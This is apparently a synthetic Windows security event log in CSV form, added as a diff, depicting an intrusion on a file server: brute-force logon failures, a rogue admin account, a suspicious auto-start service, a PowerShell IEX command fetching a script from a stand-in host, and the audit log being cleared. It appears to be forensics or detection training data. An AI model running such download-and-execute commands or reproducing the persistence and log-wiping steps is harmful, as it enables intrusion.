@@ -1,0 +1,460 @@
+Level,Date and Time,Source,Event ID,Task Category,User,Computer,Keywords,Message
+Information,14/10/2026 07:45:00,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\apatel,WS-HR-007,,"An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		WS-HR-007$
+	Account Domain:		CORP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		2
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+New Logon:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1105
+	Account Name:		apatel
+	Account Domain:		CORP
+	Logon ID:		0x1A2B3C4D
+
+Process Information:
+	Process ID:		0x2f0
+	Process Name:		C:\Windows\System32\winlogon.exe
+
+Network Information:
+	Workstation Name:	WS-HR-007
+	Source Network Address:	127.0.0.1
+	Source Port:		0
+
+Detailed Authentication Information:
+	Logon Process:		User32 
+	Authentication Package:	Negotiate
+	Key Length:		0"
+Information,14/10/2026 07:45:22,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\apatel,WS-HR-007,,"A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1105
+	Account Name:		apatel
+	Account Domain:		CORP
+	Logon ID:		0x1A2B3C4D
+
+Process Information:
+	New Process ID:		0x1f4
+	New Process Name:	C:\Program Files\Google\Chrome\Application\chrome.exe
+	Creator Process ID:	0x2f0
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Program Files\Google\Chrome\Application\chrome.exe""
+
+Token Elevation Type:		%%1936"
+Audit Failure,14/10/2026 09:11:02,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\svc_backup,SRV-FILE-01,,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			3
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		svc_backup
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	KALI-LAB
+	Source Network Address:	203.0.113.45
+	Source Port:		49857
+
+Detailed Authentication Information:
+	Logon Process:		NtLmSsp 
+	Authentication Package:	NTLM
+	Key Length:		0"
+Audit Failure,14/10/2026 09:11:06,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\svc_backup,SRV-FILE-01,,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			3
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		svc_backup
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	KALI-LAB
+	Source Network Address:	203.0.113.45
+	Source Port:		49857
+
+Detailed Authentication Information:
+	Logon Process:		NtLmSsp 
+	Authentication Package:	NTLM
+	Key Length:		0"
+Audit Failure,14/10/2026 09:11:11,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\svc_backup,SRV-FILE-01,,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			3
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		svc_backup
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	KALI-LAB
+	Source Network Address:	203.0.113.45
+	Source Port:		49857
+
+Detailed Authentication Information:
+	Logon Process:		NtLmSsp 
+	Authentication Package:	NTLM
+	Key Length:		0"
+Audit Failure,14/10/2026 09:11:17,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\svc_backup,SRV-FILE-01,,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			3
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		svc_backup
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	KALI-LAB
+	Source Network Address:	203.0.113.45
+	Source Port:		49857
+
+Detailed Authentication Information:
+	Logon Process:		NtLmSsp 
+	Authentication Package:	NTLM
+	Key Length:		0"
+Audit Failure,14/10/2026 09:11:24,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\svc_backup,SRV-FILE-01,,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			3
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		svc_backup
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	KALI-LAB
+	Source Network Address:	203.0.113.45
+	Source Port:		49857
+
+Detailed Authentication Information:
+	Logon Process:		NtLmSsp 
+	Authentication Package:	NTLM
+	Key Length:		0"
+Audit Failure,14/10/2026 09:11:32,Microsoft-Windows-Security-Auditing,4625,Logon,CORP\svc_backup,SRV-FILE-01,,"An account failed to log on.
+
+Subject:
+	Security ID:		S-1-0-0
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Logon Type:			3
+
+Account For Which Logon Failed:
+	Security ID:		S-1-0-0
+	Account Name:		svc_backup
+	Account Domain:		CORP
+
+Failure Information:
+	Failure Reason:		Unknown user name or bad password.
+	Status:			0xC000006D
+	Sub Status:		0xC000006A
+
+Process Information:
+	Caller Process ID:	0x0
+	Caller Process Name:	-
+
+Network Information:
+	Workstation Name:	KALI-LAB
+	Source Network Address:	203.0.113.45
+	Source Port:		49857
+
+Detailed Authentication Information:
+	Logon Process:		NtLmSsp 
+	Authentication Package:	NTLM
+	Key Length:		0"
+Information,14/10/2026 09:11:49,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\svc_backup,SRV-FILE-01,,"An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		KALI-LAB$
+	Account Domain:		CORP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		3
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+New Logon:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1105
+	Account Name:		svc_backup
+	Account Domain:		CORP
+	Logon ID:		0x1A2B3C4D
+
+Process Information:
+	Process ID:		0x2f0
+	Process Name:		C:\Windows\System32\lsass.exe
+
+Network Information:
+	Workstation Name:	KALI-LAB
+	Source Network Address:	203.0.113.45
+	Source Port:		0
+
+Detailed Authentication Information:
+	Logon Process:		User32 
+	Authentication Package:	Negotiate
+	Key Length:		0"
+Information,14/10/2026 09:14:03,Microsoft-Windows-Security-Auditing,4720,User Account Management,CORP\Administrator,SRV-FILE-01,,"A user account was created.
+
+Subject:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-500
+	Account Name:		Administrator
+	Account Domain:		CORP
+	Logon ID:		0x3E7
+
+New Account:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1188
+	Account Name:		helpdesk_tmp
+	Account Domain:		CORP
+
+Attributes:
+	SAM Account Name:	helpdesk_tmp
+	Display Name:		helpdesk_tmp
+	User Principal Name:	helpdesk_tmp@corp.example
+	Primary Group ID:	513
+	Password Last Set:	14/10/2026 09:20:11
+
+Additional Information:
+	Privileges:		-"
+Information,14/10/2026 09:14:20,Microsoft-Windows-Security-Auditing,4732,Security Group Management,CORP\Administrator,SRV-FILE-01,,"A member was added to a security-enabled local group.
+
+Subject:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-500
+	Account Name:		Administrator
+	Account Domain:		CORP
+	Logon ID:		0x3E7
+
+Member:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1188
+	Account Name:		helpdesk_tmp
+	Account Domain:		CORP
+
+Group:
+	Security ID:		S-1-5-32-544
+	Group Name:		Administrators
+	Group Domain:		BUILTIN
+
+Additional Information:
+	Privileges:		-"
+Information,14/10/2026 09:16:40,Microsoft-Windows-Security-Auditing,4728,Security Group Management,CORP\Administrator,SRV-FILE-01,,"A member was added to a security-enabled global group.
+
+Subject:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-500
+	Account Name:		Administrator
+	Account Domain:		CORP
+	Logon ID:		0x3E7
+
+Member:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1188
+	Account Name:		helpdesk_tmp
+	Account Domain:		CORP
+
+Group:
+	Security ID:		S-1-5-32-544
+	Group Name:		Domain Admins
+	Group Domain:		CORP
+
+Additional Information:
+	Privileges:		-"
+Information,14/10/2026 09:18:55,Service Control Manager,7045,None,SYSTEM,SRV-FILE-01,,"A service was installed in the system.
+
+Service Name:	RemoteUpdater
+Service File Name:	C:\Users\Public\updater.exe
+Service Type:	user mode service
+Service Start Type:	auto start
+Service Account:	LocalSystem"
+Information,14/10/2026 09:19:31,Microsoft-Windows-PowerShell,4104,Execute a Remote Command,CORP\Administrator,SRV-FILE-01,,"Creating Scriptblock text (1 of 1):
+$c = 'aHR0cDovL2V4YW1wbGUuaW52YWxpZC9wYXlsb2FkLmJpbg=='; IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/p.ps1')
+
+ScriptBlock ID: 8f2c1a44-3b1e-4c7a-9a11-5d2e6f7a8b90
+Path:"
+Information,14/10/2026 09:20:02,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\Administrator,SRV-FILE-01,,"A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1105
+	Account Name:		Administrator
+	Account Domain:		CORP
+	Logon ID:		0x1A2B3C4D
+
+Process Information:
+	New Process ID:		0x1f4
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Creator Process ID:	0x2f0
+	Creator Process Name:	C:\Users\Public\updater.exe
+	Process Command Line:	""C:\Windows\System32\cmd.exe"" /c net localgroup administrators
+
+Token Elevation Type:		%%1936"
+Information,14/10/2026 09:26:14,Microsoft-Windows-Security-Auditing,1102,Audit Log Cleared,CORP\Administrator,SRV-FILE-01,,"The audit log was cleared.
+
+Subject:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-500
+	Account Name:		Administrator
+	Account Domain:		CORP
+	Logon ID:		0x3E7"
+Information,14/10/2026 10:02:11,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\jsmith,WS-FIN-014,,"An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		WS-FIN-014$
+	Account Domain:		CORP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		2
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+New Logon:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1105
+	Account Name:		jsmith
+	Account Domain:		CORP
+	Logon ID:		0x1A2B3C4D
+
+Process Information:
+	Process ID:		0x2f0
+	Process Name:		C:\Windows\System32\winlogon.exe
+
+Network Information:
+	Workstation Name:	WS-FIN-014
+	Source Network Address:	127.0.0.1
+	Source Port:		0
+
+Detailed Authentication Information:
+	Logon Process:		User32 
+	Authentication Package:	Negotiate
+	Key Length:		0"
+Information,14/10/2026 10:02:35,Microsoft-Windows-Security-Auditing,4688,Process Creation,CORP\jsmith,WS-FIN-014,,"A new process has been created.
+
+Creator Subject:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1105
+	Account Name:		jsmith
+	Account Domain:		CORP
+	Logon ID:		0x1A2B3C4D
+
+Process Information:
+	New Process ID:		0x1f4
+	New Process Name:	C:\Windows\System32\notepad.exe
+	Creator Process ID:	0x2f0
+	Creator Process Name:	C:\Windows\explorer.exe
+	Process Command Line:	""C:\Windows\System32\notepad.exe""
+
+Token Elevation Type:		%%1936"
+Information,14/10/2026 13:44:50,Microsoft-Windows-Security-Auditing,4624,Logon,CORP\rjones,WS-IT-002,,"An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		WS-IT-002$
+	Account Domain:		CORP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		2
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+New Logon:
+	Security ID:		S-1-5-21-1004336348-1177238915-682003330-1105
+	Account Name:		rjones
+	Account Domain:		CORP
+	Logon ID:		0x1A2B3C4D
+
+Process Information:
+	Process ID:		0x2f0
+	Process Name:		C:\Windows\System32\winlogon.exe
+
+Network Information:
+	Workstation Name:	WS-IT-002
+	Source Network Address:	127.0.0.1
+	Source Port:		0
+
+Detailed Authentication Information:
+	Logon Process:		User32 
+	Authentication Package:	Negotiate
+	Key Length:		0"
